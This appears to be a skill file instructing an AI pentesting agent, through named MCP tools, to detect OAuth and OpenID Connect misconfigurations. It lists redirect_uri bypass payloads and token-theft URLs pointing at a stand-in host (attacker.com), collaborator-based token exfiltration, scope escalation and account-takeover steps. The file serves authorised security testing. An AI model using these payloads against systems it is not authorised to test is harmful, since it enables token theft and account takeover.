# OAuth Misconfiguration Detection Skill

## Objective
Identify OAuth 2.0 and OpenID Connect misconfigurations that can lead to account takeover, token theft, or unauthorized access.

## Instructions

### 1. Identify OAuth Implementation
Look for:
- OAuth authorization endpoints
- Token endpoints
- Redirect URIs with authorization codes
- Access/refresh tokens in responses
- Social login buttons (Google, Facebook, GitHub)

**Common OAuth endpoints:**
```
/oauth/authorize
/oauth/token
/oauth2/authorize
/oauth2/token
/.well-known/openid-configuration
/auth/callback
/login/oauth/authorize
```

### 2. Redirect URI Manipulation

**Open redirect via redirect_uri:**
```
/oauth/authorize?client_id=xxx&redirect_uri=https://attacker.com&response_type=code
```

**Bypass techniques:**
```
# Subdomain
redirect_uri=https://attacker.legitimate.com

# Path traversal
redirect_uri=https://legitimate.com/../../../attacker.com

# URL encoding
redirect_uri=https://legitimate.com%40attacker.com

# Parameter pollution
redirect_uri=https://legitimate.com&redirect_uri=https://attacker.com

# Fragment
redirect_uri=https://legitimate.com#@attacker.com

# Localhost bypass
redirect_uri=https://localhost.attacker.com
redirect_uri=http://127.0.0.1.attacker.com

# Special characters
redirect_uri=https://legitimate.com\.attacker.com
redirect_uri=https://legitimate.com%00.attacker.com
```

### 3. Authorization Code Theft

**Token leakage via Referer:**
1. OAuth redirects to legitimate site with code in URL
2. Legitimate site loads external resource
3. Code leaked in Referer header

**Test:**
- Check if callback page loads external resources
- Use `collaborator_generate` as external resource

### 4. CSRF in OAuth Flow

**Missing state parameter:**
```
/oauth/authorize?client_id=xxx&redirect_uri=xxx&response_type=code
# No state parameter = CSRF vulnerable
```

**Predictable state:**
- Check if state can be reused
- Check if state is validated

**Attack scenario:**
1. Attacker initiates OAuth flow
2. Captures authorization URL with their account
3. Victim clicks link
4. Victim's session linked to attacker's account

### 5. Token Theft via Open Redirect

**Implicit flow token theft:**
```
/oauth/authorize?response_type=token&redirect_uri=https://legitimate.com/redirect?url=https://attacker.com

# Token in fragment: https://legitimate.com/redirect?url=https://attacker.com#access_token=xxx
# If redirect follows, token sent to attacker
```

### 6. Scope Manipulation

**Request elevated scopes:**
```
/oauth/authorize?scope=read → /oauth/authorize?scope=read+write+admin
/oauth/authorize?scope=email → /oauth/authorize?scope=email+profile+admin
```

**Scope upgrade attack:**
1. Get token with limited scope
2. Use token to request more scopes
3. Check if server validates scope changes

### 7. Client Confusion Attack

**Test with different client_id:**
```
# Use legitimate client_id with attacker's redirect_uri
/oauth/authorize?client_id=legitimate_app&redirect_uri=https://attacker.com
```

### 8. Token/Code Reuse

**Authorization code reuse:**
1. Capture authorization code
2. Exchange for token
3. Try to reuse code for another token

**Token lifetime issues:**
- Check if tokens expire properly
- Test refresh token rotation
- Check for token revocation

### 9. PKCE Bypass

**Missing PKCE enforcement:**
```
# Should require code_verifier
/oauth/token?grant_type=authorization_code&code=xxx&code_verifier=yyy

# Test without code_verifier
/oauth/token?grant_type=authorization_code&code=xxx
```

**Downgrade attack:**
```
# Request without PKCE
/oauth/authorize?client_id=xxx&response_type=code
# No code_challenge parameter
```

### 10. ID Token Validation Issues

**JWT manipulation in ID tokens:**
- Algorithm confusion (RS256 → HS256)
- Missing signature validation
- Expired token acceptance
- Invalid issuer/audience acceptance

Use `jwt_decode` to analyze ID tokens.

### 11. Account Linking Vulnerabilities

**Email not verified:**
1. Register with victim@example.com (unverified)
2. Link OAuth account
3. Victim can't register their email

**Account takeover via OAuth:**
1. Find OAuth provider that doesn't verify email
2. Register with victim's email on OAuth provider
3. Link to target application
4. Access victim's account

### 12. Token Leakage Points

**Check for tokens in:**
- URL parameters
- Browser history
- Server logs
- Referer headers
- Error messages
- JavaScript variables

### 13. Grant Type Confusion

**Test different grant types:**
```
grant_type=authorization_code
grant_type=implicit
grant_type=password
grant_type=client_credentials
grant_type=refresh_token
```

**Resource Owner Password Credentials:**
```
/oauth/token?grant_type=password&username=user&password=pass&client_id=xxx
```

### 14. Well-Known Endpoint Analysis

**Fetch configuration:**
```
GET /.well-known/openid-configuration
GET /.well-known/oauth-authorization-server
```

**Analyze for:**
- Supported grant types
- Token endpoints
- JWKS URI
- Scopes supported

### 15. Confirm and Document
If confirmed, create finding with:
- Vulnerable OAuth flow
- Misconfiguration type
- PoC showing exploitation
- Evidence (captured tokens, unauthorized access)
- Impact assessment

## MCP Tools to Use
- `http1_request` / `http2_request`: Test OAuth endpoints
- `jwt_decode`: Analyze ID tokens
- `collaborator_generate` / `collaborator_poll`: Token exfiltration
- `url_encode`: Encode redirect URIs
- `repeater_tab_with_payload`: Manual testing
- `issue_create`: Report confirmed finding

## References
- PayloadsAllTheThings/OAuth Misconfiguration
- PortSwigger OAuth Vulnerabilities
- RFC 6749 - OAuth 2.0
